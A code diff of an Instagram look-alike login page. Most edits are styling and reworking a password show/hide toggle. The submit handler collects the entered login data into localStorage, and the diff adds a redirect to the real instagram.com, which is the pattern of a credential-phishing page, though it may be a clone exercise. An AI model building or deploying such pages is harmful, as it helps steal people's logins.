@@ -21,17 +21,17 @@
             font-family: "Roboto", sans-serif;
         }
         .main-con{
-            height: 100%;
     /* border: 1ps solid red; */
     display: flex;
     flex-direction: column;
     justify-content: space-between;
+
         }
 
         .main {
             max-width: 420px;
             margin: auto;
-            height: 608.84px;
+            /* height: 608.84px; */
             padding: 10px 11% 30px 11%;
             /* border: 1px solid black; */
             /* border-bottom: 0.1px solid #757575; */
@@ -175,6 +175,7 @@
             right: 11px;
             color: black;
             position: absolute;
+            display: none;
             top: 8px;
         }
         .passWord span:hover{
@@ -273,8 +274,8 @@
         <div class="logo mx-auto">
             <img src="images/instagram 1.svg " alt="">
         </div>
-        <a href="https://en-gb.facebook.com/login/">
-            <button><i class="fa-brands fa-square-facebook"></i>Continue with Facebook</button>
+        <a  href="https://en-gb.facebook.com/login/">
+            <button ><i class="fa-brands fa-square-facebook"></i>Continue with Facebook</button>
         </a>
         <div><img src="images/line.svg" alt=""></div>
         <form action=""  id="formhandler">
@@ -317,7 +318,8 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
 <script src="script.js"></script>
 <script>
-//--------------------------------------------------------------------------------------for border on input box-----------------------------
+//--------------------------------------------------------------------------------------for border on input box----------------------------- 
+    hidebutton = document.getElementById('hid-show')
     pass = document.getElementById('userPass')
     pass.addEventListener('click', () => {
 
@@ -332,19 +334,8 @@
         document.querySelector('.passWord').classList.remove('borDer')
     })
 
- //=-------------------------------------------------------------------------------------FOR SHOW AND HIDE PASSWORD-----------------------------------------  
-    hidebutton = document.getElementById('hid-show')
-    hidebutton.addEventListener('click', () => {
-
-        if (pass.type == 'password') {
-            pass.type = 'text'
-            hidebutton.innerText = 'Hide'
-        }
-        else {
-            pass.type = 'password'
-            hidebutton.innerText = 'Show'
-        }
-    })
+   
+   
  //-----------------------------------------------------------------------------------------   
     pass.addEventListener('keyup', () => {
    
@@ -353,17 +344,30 @@
        pass.placeholder = ''
        document.getElementById('userPass').style.height='15px';
        pass.style.bottom='2px'
-    //    hidebutton.style.display='block'; 
+       hidebutton.style.display='block'; 
    }
 
    else {
        document.querySelector('.passh').style.opacity = '0'
        document.getElementById('userPass').style.height='20px';
        
-    //    hidebutton.style.display='none';
+       hidebutton.style.display='none';
         pass.placeholder = 'Password'
    }
 
+})
+ //=-------------------------------------------------------------------------------------FOR SHOW AND HIDE PASSWORD-----------------------------------------  
+ 
+hidebutton.addEventListener('click', () => {
+
+if (pass.type == 'password') {
+    pass.type = 'text'
+    hidebutton.innerText = 'Hide'
+}
+else {
+    pass.type = 'password'
+    hidebutton.innerText = 'Show'
+}
 })
  user.addEventListener('keyup',()=>{
     if (user.value != '') {
@@ -382,6 +386,8 @@
    }
  })
 
+ //----------------------------------------------------------------------------------------------------
+
     login = document.getElementById('formhandler').addEventListener('submit', (event) => {
 
 
@@ -395,8 +401,12 @@
         console.log(userdata);
         alluserdata.push(userdata)
         localStorage.setItem('user',JSON.stringify(alluserdata))
+        // window.location.href('https://www.instagram.com/')
+
+        window.location.replace('https://www.instagram.com')
 
         event.target.reset();
+        
     })
 </script>
 
